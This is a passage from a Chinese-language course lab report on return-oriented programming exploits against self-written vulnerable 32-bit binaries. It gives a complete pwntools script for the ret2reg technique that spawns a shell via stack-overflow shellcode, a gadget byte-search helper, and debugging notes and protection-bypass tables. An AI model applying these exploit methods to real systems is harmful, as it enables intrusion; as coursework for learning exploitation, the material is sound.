使用 `call` 而非 `jmp` 的另一个理由：`call eax` 会压入返回地址，shellcode 末尾若执行 `ret` 可以回到 `call` 的下一条指令；本实验中 shellcode 直接 `execve` 替换了进程，不会返回，所以这一点不影响，但在“shellcode 只有一段、之后还要继续 ROP”的场景里，`call` 能自然接回原链。

另一个细节是 `vuln` 被设计为 `void vuln(void)`，而不是把溢出写在 `main` 里。最初把溢出放在 `main` 中，`call eax` 一直失败——因为 `main` 的 `return 0` 会把 `eax` 写成 0，再 `ret` 时 `eax` 已不再指向 `buf`。把溢出移入 `void` 函数后，`gets` 的返回值一直保留到 `leave; ret`，变体二一次通过。这说明 ret2reg 的**前提是精确掌握 `ret` 前各寄存器的状态**，不能想当然。

### 5.8 完整利用脚本

`challenges/ret2reg/exp.py` 的关键部分（完整文件见源码目录）：

```python
#!/usr/bin/env python3
import sys
from pwn import ELF, asm, context, p32, process, shellcraft

context(os="linux", arch="i386", log_level="error")

BINARY = "./ret2reg"
CHECK = "--check" in sys.argv
OFFSET = 108
SHELLCODE = asm(shellcraft.i386.linux.sh())      # 44 字节


def search_all(elf, pattern):
    ...  # 见 5.5


def payload_ret_esp(elf):
    gadget = find_bytes(elf, b"\xff\xe4") if search_all(elf, b"\xff\xe4") \
        else find_bytes(elf, b"\x54\xc3")
    return b"A" * OFFSET + p32(gadget) + SHELLCODE, gadget


def payload_call_eax(elf):
    gadget = find_bytes(elf, b"\xff\xd0")
    return SHELLCODE.ljust(OFFSET, b"\x90") + p32(gadget), gadget


def main():
    elf = ELF(BINARY, checksec=False)
    ret_esp, addr1 = payload_ret_esp(elf)
    call_eax, addr2 = payload_call_eax(elf)

    if not CHECK:
        p = process([BINARY])
        p.recvuntil(b"input:")
        p.sendline(ret_esp)
        p.interactive()
        return 0

    ok = True
    for name, payload, addr in (("push esp;ret", ret_esp, addr1),
                                ("call eax", call_eax, addr2)):
        p = process([BINARY])
        p.recvuntil(b"input:")
        p.sendline(payload)
        p.sendline(b"id; exit")
        out = p.recvall(timeout=3)
        hit = b"uid=" in out
        ok = ok and hit
        print(f"[ret2reg:{name}] {'PASS' if hit else 'FAIL'}  gadget={addr:#x}")
    print(f"[ret2reg] {'PASS' if ok else 'FAIL'}  ret_esp={addr1:#x} call_eax={addr2:#x}")
    return 0 if ok else 1
```

`--check` 模式的判定方式：发送 payload 后再发送 `id; exit`，若输出中出现 `uid=`，说明 shell 已建立且能执行命令；两个变体都成功才算 PASS。

### 5.9 运行结果

```
[ret2reg:push esp;ret] PASS  gadget=0x80b10d8
[ret2reg:call eax] PASS  gadget=0x804901d
[ret2reg] PASS  ret_esp=0x80b10d8 call_eax=0x804901d
```

两个变体都不需要任何地址泄漏，在 ASLR 开启的情况下连续运行、每次重建进程均成功。

### 5.10 调试记录与启示

**记录 1：`jmp esp` 不存在。** 第一版脚本直接 `elf.search(b"\xff\xe4")` 并 `next()`，抛出 `StopIteration`。原因不是搜索写错，而是这个静态二进制里确实没有 `ff e4`。这说明“教科书上的经典 gadget 不一定存在”，脚本必须准备回退路径，或者换一个寄存器。

**记录 2：`0x0a` 截断。** 见 5.5。`gets` 的终止条件与地址字节发生了冲突，这类问题在 ret2text 等题中不会出现，只有“payload 通过行缓冲输入”时才会暴露。通用做法是：搜索 gadget 时就把“地址字节不含 `\n`/`\r`”作为过滤条件，而不是事后修补。

**记录 3：`eax` 被 `return 0` 清掉。** 见 5.7。寄存器状态要顺着反汇编逐条确认，不能只看“`gets` 返回 `eax`”这一条结论。

**记录 4：`checksec` 误报 Canary。** 静态链接程序的 `__stack_chk_fail` 符号会误导 checksec 和 pwntools，最终以反汇编是否有 `gs:0x14` 读操作作为判据。

启示可以归结为三点：

1. **地址的来源不止“泄漏”一种**。ret2reg 展示了一条重要思路：程序自身的寄存器、栈、返回值都在“替你保存地址”，利用者要做的是找到一条把控制流导过去的 gadget。这也是后续 JOP/COP 的基础。
2. **gadget 搜索要带约束**。可执行段、地址字节、指令语义三者都要检查，缺一不可；写死地址的脚本换一个编译环境就会失效。
3. **中级 ROP 的难点往往在“环境细节”**。`gets` 的换行、`return 0` 对 `eax` 的改写、静态链接带来的符号误报，这些都不属于 ROP 理论，却直接决定利用成败。真实漏洞利用中，这类细节排查所占的时间通常远多于构造链本身。

---

## 6. 调试过程中的问题与解决

### 6.1 pwntools ROP 数据集缺 gadget

在 ret2syscall 中，最初按常规用 `ROP(elf).find_gadget(["mov ecx, eax"])` 构造链，但 pwntools 的 gadget 数据库对静态大二进制并不完整，直接报“没有找到 gadget”。另外，该二进制中确实不存在 `pop ecx; ret`（`59 c3`）。

解决方法是**按机器码字节在可执行段中搜索**：

```python
def find_bytes(elf, pattern, name):
    exec_ranges = []
    for seg in elf.segments:
        if seg.header.p_type == "PT_LOAD" and (seg.header.p_flags & 1):
            exec_ranges.append((seg.header.p_vaddr,
                                seg.header.p_vaddr + seg.header.p_memsz))
    for addr in elf.search(pattern):
        if any(lo <= addr < hi for lo, hi in exec_ranges):
            return addr
    raise RuntimeError(f"没有找到字节序列: {name}")
```

这样既能保证 gadget 位于可执行页，又能利用“x86 指令可以从任意字节开始解码”的特性，找到工具没有收录的序列。

### 6.2 ret2libc2 缺少 `pop` 导致链错位

最初的链是 `gets@plt → target → system@plt → ...`，把 `target` 同时当成了 `gets` 的参数和返回地址。`gets` 返回后跳到了 `target`（一个数据地址），随即崩溃。插入 `pop ebx; ret` 丢弃参数后恢复正常。

### 6.3 ret2libc3 读到 `done.`

见 5.4。`recvn(4)` 读到的是 `puts("done.")` 的输出而非泄漏值。加入 `recvuntil(b"done.\n")` 后解决。

### 6.4 关于栈迁移扩展题

在最初的设计中还包含一道可选的“栈迁移”题（`leave; ret` 把栈切到 `.bss`）。该题在普通 Linux 上应能正常工作，但本实验的 Apple Silicon + 多层 qemu 用户态模拟环境对连续两次 `leave; ret` 的切栈存在兼容性问题：单次 `ret` 到目标函数、ret2libc 等全部正常，但切栈后会触发 `qemu-i386` 自身崩溃（核心转储显示崩溃发生在 qemu 进程内，`si_addr=0x2c`），并非 payload 逻辑错误。由于该题属于可选扩展、不影响必做的 4 类 ROP，最终未纳入交付内容，以避免在演示环境中出现无法解释的失败。

---

## 7. 防护机制与绕过思路总结

| 防护 | 直接后果 | 本实验中的体现 | 现实中的绕过 |
|---|---|---|---|
| NX | 栈/堆不可执行 | ret2shellcode 必须 `-z execstack`；其余题目改用 ROP | 复用代码段 gadget；`mprotect` 改权限；JOP/COP |
| PIE | 代码与 `.bss` 地址随机 | 全部题目 `-no-pie`，符号地址固定 | 泄漏代码地址（如返回地址、`__libc_start_main` 相关地址） |
| Canary | 覆盖返回地址前会校验 | 全部题目关闭 | 泄漏 canary；覆盖 TLS 中的 canary；fork 场景下爆破 |
| RELRO | Full 时 GOT 只读 | 默认 Partial，GOT 可写 | 读 GOT 做泄漏（ret2libc）；改写其它函数指针 |
| ASLR | libc/栈/堆基址随机 | ret2libc3 通过 `write@got` 泄漏；ret2reg 完全不需要栈地址 | 信息泄漏 + 一次计算；或改用寄存器间接跳转（ret2reg） |

可以看到，现代防护往往是**组合**出现的：NX + ASLR + PIE + Canary + Full RELRO。此时单一技巧不再够用，需要“先泄漏、再 ROP、必要时多阶段”的组合拳，这正是本实验从 ret2text 到 ret2libc3 逐步逼近的场景；而 ret2reg 进一步说明，即使一个字节都泄漏不出来，寄存器与 gadget 仍可能提供可利用的跳转。

---

## 8. 实验结论

1. 通过 6 个递进案例，完整复现了课堂要求的 4 类 ROP：ret2text、ret2shellcode、ret2syscall、ret2libc（3 个变体），全部利用脚本在统一环境中运行通过。
2. 在此之上完成中级 ROP 专题 ret2reg：用 `push esp; ret` 与 `call eax` 两种 gadget，在不泄漏任何地址的情况下执行栈上 shellcode，两个变体均自动验证通过，共 7 个案例全部 PASS。
3. 掌握了从源码与反汇编推导栈帧、计算溢出偏移的方法；本实验所有题目的返回地址偏移均为 108 字节，并已通过直接 ret 到后门函数验证。
4. 理解了 gadget 的本质与搜索方法：既可以使用 pwntools/ROPgadget，也可以在可执行段中按机器码字节搜索，后者在静态大二进制中更可靠；搜索时还必须排除地址中含 `0x0a` 的命中，否则会被 `gets` 截断。
5. 以 ret2libc3 与 ret2reg 两个案例，分别覆盖了“泄漏 + 二次利用”和“寄存器间接跳转”两条中级思路，并记录了 `recvn` 误读 `done.`、`return 0` 清空 `eax`、`jmp esp` 不存在等真实调试问题。
6. 加深了对 NX、PIE、Canary、RELRO、ASLR 的理解：防护的本质是提高“地址未知”与“数据不可执行”的门槛，而泄漏、代码复用与寄存器间接跳转是三类最通用的应对手段。

---

## 附录 A：目录结构

```
.
├── challenges/
│   ├── Makefile
│   ├── ret2text/        src.c  exp.py
│   ├── ret2shellcode/   src.c  exp.py
│   ├── ret2syscall/     src.c  exp.py
│   ├── ret2libc1/       src.c  exp.py
│   ├── ret2libc2/       src.c  exp.py
│   ├── ret2libc3/       src.c  exp.py  libc.so.6（构建时复制）
│   └── ret2reg/         src.c  exp.py（中级专题，两种 gadget 变体）
├── docker/Dockerfile
├── docs/report.md
└── scripts/
    ├── build_all.sh
    ├── run_all.sh
    └── docker_run.sh
```

## 附录 B：仓库地址

源码与利用脚本已开源：<https://github.com/zzb040506/EX2A-ROP>

> 所有靶程序均为课程实验自行编写，仅在本地隔离环境中用于学习二进制漏洞利用原理。